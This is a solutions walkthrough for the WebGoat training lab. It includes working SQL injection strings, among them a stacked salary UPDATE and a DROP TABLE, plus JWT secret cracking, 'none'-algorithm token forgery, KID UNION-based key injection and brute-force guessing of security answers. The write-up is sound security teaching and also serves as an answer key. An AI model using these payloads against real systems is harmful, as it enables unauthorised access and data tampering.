---
title: "WebGoat - Solutions"
author: [Thomas Gingele]
date: "2023-10-09"
---

I would like to mention that I will be using **Burpsuite** instead of **OWASP ZAProxy**
for the majority of the tasks. Please feel free to follow the tutorials provided by
WebGoat if you are not comfortable with this tool.

# Registered User:

```
leastsignificantbit:password
```

# Introduction

## WebGoat

### Task 1

No answer needed.

## WebWolf

### Task 1

No answer needed.

### Task 2

No answer needed.

### Task 3

Type in your e-mail address below and check your inbox in WebWolf. Then type in the unique code from the e-mail in the field below.

How to access the Mailbox:

1. Go to `http://localhost/WebWolf/login`.
2. Log in with your WebGoat credentials.
3. Navigate to "MailBox" in the top toolbar.

Go back to Web**Goat** and enter an email with the following pattern:

```
Pattern: <username>@<doesn't matter>
Example: leastsignificantbit@canliterallybeanything.lmao
```

Go back to the mailbox and copy the code from the received email.
The code for the above email is:

```
tibtnacifingistsael
```

### Task 4

This task seems to be optional.
The answer is the same code from *Task 3*.

Just click on the link and enter any password.
Alternatively, visit the following URL manually:

```
http://localhost:8080/WebGoat/WebWolf/landing/password-reset
```

# General

## HTTP Basics

### Task 1

No answer needed.

### Task 2

It does not matter what is input here.
Type anything and press the button.

### Task 4

What type of HTTP command did WebGoat use for this lesson. A POST or a GET.

```
Was the HTTP command a POST or a GET: POST
What is the magic number            : 97
```

## HTTP Proxies

### Task 1

No answer needed.

### Task 2

No answer needed.

### Task 3

No answer needed.

### Task 4

No answer needed.

### Task 5

No answer needed.

### Task 6

```text
GET /WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */ *
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 15
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/WebGoat/start.mvc
Cookie: JSESSIONID=e3dHiM5wF8CB2DJW6Sb_K1NAYbCAcl3W8PONY_oD; WEBWOLFSESSION=YR6BTRUQH_89HzCbp9q68HiWVQGdYCgWyDWVW7UL
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
x-request-intercepted:true
```

### Task 7

No answer needed for the task.

### Task 8

No answer needed.

### Task 9

No answer needed.

### Task 10

No answer needed.

## Developer Tools

### Task 1

No answer needed.

### Task 2

No answer needed.

### Task 3

No answer needed.

### Task 4

Use the console in the dev tools and call the javascript function webgoat.customjs.phoneHome().

The answer for this question is randomly generated each time the function is called.
Simply open your browsers developer console and run it to receive the result.

![Developer Tools Task 4](./.img/dev_tools_t4.png)

### Task 5

No answer needed.

### Task 6

In this assignment you need to find a specific HTTP request and read a randomized number from it.

Open the "Network" tab in your browsers developer tools and take a look at the request
body of the request. Note, that this answer is also randomly generated each time the request is send.

![Developer Tools Task 6](./.img/dev_tools_t6.png)

## CIA Triad

### Task 1

No answer needed.

### Task 2

No answer needed.

### Task 3

No answer needed.

### Task 4

No answer needed.

### Task 5

1. *How could an intruder harm the security goal of confidentiality?*

Solution 3: By stealing a database where names and emails are stored and uploading it to a website.

2. *How could an intruder harm the security goal of integrity?*

Solution 1: By changing the names and emails of one or more users stored in a database.

3. *How could an intruder harm the security goal of availability?*

Solution 4: By launching a denial of service attack on the servers.

4. *What happens if at least one of the CIA security goals is harmed?*

Solution 2: The system's security is compromised even if only one goal is harmed.

## Crypto Basics

### Task 1

No answer needed.

### Task 2

If you have no Linux terminal available, you can decode the string here: [CyberChef - Github.io](https://gchq.github.io/CyberChef/)

Otherwise, you can use the following command:

```bash
echo "bGVhc3RzaWduaWZpY2FudGJpdDpwYXNzd29yZA==" | base64 -d
```

The answer will be the credentials of the logged in user.
For this example the string will decode to:

```text
leastsignificantbit:password
```

HTTP Basic Authentication uses Base64 encoding to transfer a clients credentials
through a request header called `Authorization`.
This header contains the credentials in the following format:

```text
<username>:<password>
```

This is then encoded and prepended with the string "Basic" to let the server know what type of
authorization is used. A full header would look like this:

```text
Authorization: Basic eW91d2lzaHRoaXN3YXNteXBhc3N3b3JkOmJ1dG5vcGUK
```

### Task 3

The following string needs to be decoded:

```text
{xor}Oz4rPj0+LDovPiwsKDAtOw==
```

Apart from the `{xor}`, this seems to be encoded with `base64`.
Using the command from *Task 2*, it decodes to:

```text
;>+>=>,:/>,,(0-;
```

The `{xor}` may be a hint to how this string is encoded.
It is possible to brute force XOR encoded strings using [CyberChef - Github.io](https://gchq.github.io/CyberChef/).

The string decodes to:

```text
databasepassword
```

![Crypto Basics Task 3](./.img/crypt_basics_t3.png)

### Task 4

The easiest solution is to use a hash database to simply look up what tha original text is.
In this case, [Crackstation.net](https://crackstation.net/) was used.

![Crypto Basics Task 4](./.img/crypt_basics_t4.png)

Alternatively, the tool `john` can be used to crack the hash locally.

```bash
echo "21232F297A57A5A743894A0E4A801FC3" > hash_1
john hash_1 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5

echo "5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8" > hash_2
john hash_2 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
```

The hashes should decode to the following two words:

```text
admin
password
```

### Task 5

No asnwer needed.

### Task 6

The modulus can be read from the private key file like this:

```bash
openssl rsa -in myprivate.pem -noout -modulus 
```

To sign this string, I came up with this fancy oneliner:

```bash
openssl rsa -in myprivate.pem -noout -modulus | cut -d '=' -f 2 | tr -d '\n' | openssl dgst -sha256 -sign myprivate.pem | base64
```

# (A1) Injection

## SQL Injection (intro)

### Task 1

No answer needed.

### Task 2

Look at the example table. Try to retrieve the department of the employee Bob Franco. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.

```sql
SELECT department FROM employees WHERE userid = 96134
```

### Task 3

Try to change the department of Tobi Barnett to 'Sales'. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.

```sql
UPDATE employees SET department='Sales' WHERE userid = 89762
```

### Task 4

Try to modify the schema by adding the column "phone" (varchar(20)) to the table "employees".

```sql
ALTER TABLE employees ADD phone varchar(20)
```

### Task 5

Try to grant rights to the table `grant_rights` to user `unauthorized_user`.

```sql
GRANT SELECT ON grant_rights TO unauthorized_user
```

### Task 6

No answer needed.

### Task 7

No answer needed.

### Task 8

No answer needed.

### Task 9

Try using the form below to retrieve all the users from the users table. You should not need to know any specific user name to get the complete list.

```sql
SELECT * FROM user_data WHERE first_name = 'Smith' OR '1' = '1'
```

### Task 10

Using the two Input Fields below, try to retrieve all the data from the users table.

```sql
Login_Count: 0
User_Id    : 0 OR 1=1
```

### Task 11

Use the form below and try to retrieve all employee data from the employees table.

```sql
Employee Name     : Bit
Authentication TAN: 0' OR '1'='1
```

### Task 12

Change your own salary so you are earning the most.

```sql
Employee Name     : Smith
Authentication TAN: 3SL99A'; UPDATE employees SET salary='99999999' WHERE userid = '37648
```

### Task 13

Delete the `access_log` table.

```sql
"'; DROP TABLE access_log -- -
```

### Notice

All other tasks of the Injection chapter are not required.
Because of this, solutions will be added later.

# (A2) Broken Authentication

## Authentication Bypasses

### Task 1

No andwer needed.

### Task 2

Intercept the POST request with a proxy of your chaoice:

```
POST /WebGoat/auth-bypass/verify-account HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 84
Origin: http://localhost:8080
Connection: close
Referer: http://localhost:8080/WebGoat/start.mvc
Cookie: JSESSIONID=7UAjP5LPBz1TN8T-wzcu1pZDAJSKTguUiX6pbW6m
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

secQuestion0=a&secQuestio1n=b&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
```

Change the parameters `secQuestion0` and `secQuestion1` to `secQuestion2` and `secQuestion3` and send the request.
This will successfully circumvent the simulated 2FA.

## JWT Tokens

### Task 1

No answer needed.

### Task 2

No answer needed.

### Task 3

The given token can be base64-decoded with any normal tool.

Here is one of the possible methods:

```bash
echo "<token>" | tr '.' '\n' | base64 -d
```

The username is `user`.

### Task 4

No answer needed.

### Task 5

Change the logged in user to `Tom` in the top right of the task frame.

![Vote Fraud Step 1](.img/vote_fraud_1.png)

Intercept the response to the request that is send when pressing the button.

![Vote Fraud Step 2](.img/vote_fraud_2.png)

Extract the token from the `access_token` cookie.

![Vote Fraud Step 3](.img/vote_fraud_3.png)

Then, brute force the secret with `john`

```bash
echo "<token>" > jwt.txt

john --wordlist=<...>/rockyou.txt --format=HMAC-SHA512 jwt.txt
```

The token secret is `victory`.
Using this, a new token can be created.
Set the `admin` field to `true` and the `user` field to `Admin`.

![Vote Fraud Step 4](.img/vote_fraud_4.png)

Intercept the request that is send out when pressing the gargabe bin button next to the user switch button.
This will send a POST request to delete all votes.
Then, replace the cookie `access_token` with the new admin-token that has just been created.

Sending this modified request should result in all votes being removed.

![Vote Fraud Step 5](.img/vote_fraud_5.png)

### Task 6

No answer needed.

### Task 7

1. *1. What is the result of the first code snippet?*

Solution 1: Throws an exception in line 12.

2. *What is the result of the second code snippet?*

Solution 3: Logs an error in line 9.

### Task 8

Bruteforce the token with `john`:

```bash
john --wordlist=<...>/rockyou.txt --format=HMAC-SHA256 jwt.txt
```

The secret key is `business`.

Change the username of the token here: [jwt.io](https://jwt.io/)
Also update the expiration date to a point in the future if necessary.
Then submit the new token.

![Broken Authentication Task 8](.img/broken_auth_t8.png)

### Task 9

No answer needed.

### Task 10

Visit `http://localhost:8080/WebGoat/images/logs.txt` and extract the old token.

```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMz
E0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iO
iJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQk
yDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4Qu
qmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
```

Use any Base64 de-/encoder to change the token algorithm to "*none*".

![Remove signing algorithm](.img/broken_auth_t10_1.png)

Increase the expiration date to some point in the future.
Base64 padding has been added to the original strings to make editing the text easier.

![Increase expiration date of the JW-Token](.img/broken_auth_t10_2.png)

Insert the token into the original requests `Authorization` header.
After submitting the request, the task should be complete.

![Update the original request](.img/broken_auth_t10_3.png)

## Task 11

First, intercept the request that is send out when pressing anyone of the "*Delete*" button.
This request should contain Jerry's JWT.

Mext, enter the token into [jwt.io](https://jwt.io).
Change the name from "*Jerry*" to "*Tom*".

After this, look at the KID.
Through rather complicated error based SQLi probing, it is possible to figure out that this field
is vulnerable to such attacks.

The proof for this looks the following:

Entering any string that is not `webgoat_key` will result in a return code of 500 when submitting
the request with the new token.

Entering the string `webgoat_key';--` will only give out the error, that the token is invalid, but
not error out the server.

Entering the string `webgoat' AND 1=1;--` will also compute without a server error.
Another working example is `nopynope' OR 1=1;--`.

This solidifies the assumption that the manually inserted SQL statements are not part of the
string that is actually queried for in the database, as this should lead to a `500 - Internal Server Error` response.

Time based SQLi is not possible  and leads to a `500`, confirmed with the following injection:

```
webgoat_key' AND sleep(10);--
```

The SQL query returns a single value.
This can be confirmed with these statements:

```
webgoat_key' ORDER BY 1;--    This one works
webgoat_key' ORDER BY 2;--    This one fails -> only one column
```

Since the KID is used to fetch a signing key from a database to verify the tokens signature
on the server-side, it might be possible to inject a custom signing key.
The basic syntax for this would look like this:

```
nonexistant_key' UNION SELECT 'injected_key' FROM 'unknown_table';--
```

To make the development of the exact payload easier, [SQL Fiddle](http://sqlfiddle.com) will be used.
It is enough to roughly simulate what the real database *may* look like, which can be guessed based
on the results of the previous enumeration.

```sql
CREATE TABLE IF NOT EXISTS `Unknown` (
  `kid` varchar(200) NOT NULL,
  `secret` varchar(200) NOT NULL,
  PRIMARY KEY (`kid`)
) DEFAULT CHARSET=utf8;

INSERT INTO `Unknown` (`kid`, `secret`) VALUES ('webgoat_key', 'secret');
```

![SQL Fiddle Database Setup](.img/jwt_sqli_1.png)

While setting up this database does not necessarily help with finding the correct payload, it
can be used to verify that the syntax of any SQL statements is correct.

With this, a statement is crafted that can return a custom string instead of the
database entry associated with the KID `webgoat_id`

```sql
nopynope' UNION SELECT 'mykeynow' FROM INFORMATION_SCHEMA.TABLES;--
```

The corresponding token was created with [jwt.io](https://jwt.io).

![JWT KID UNION SELECT Injection](.img/jwt_sqli_2.png)

This solves the task.

![JWT KID Injection Solution](.img/jwt.sqli_3.png)


## Password Resest

### Task 1

No answer needed.

### Task 2

Simply follow the instructions provided in the tasks description.

### Task 3

No answer needed.

### Task 4

First, intercept the request that is send out when pressing the "*Submit*" button.
Load the request into Burpsuites Intruder module.

Highlight the value of the security question and press `Add`.
This will mark the string as the property that will be attacked.
that a malicious actor has to compromise it.

![Burpsuite Intruder Setup Step 1](.img/passwword_reset_t4_1.png)

Then, ChatGPT is used to generate a wordlist containing differnent names of colors.

```txt
red
green
blue
yellow
orange
purple
pink
turquoise
brown
gray
black
white
magenta
cyan
lavender
maroon
teal
navy
olive
silver
```

This list can be loaded into Intruder as the payload by copying the wordlist
and pressing the "*Paste*" button in the "*Payloads*" tab.

![Burpsuite Intruder Setup Step 2](.img/password_reset_t4_2.png)

Attack the website by pressing the "*Start Attack*" button in the top right.
Filtering the output by response size, the correct color can quickly be identified.
It is `green`.

![Burpsuite Intruder Attack](.img/password_reset_t4_3.png)
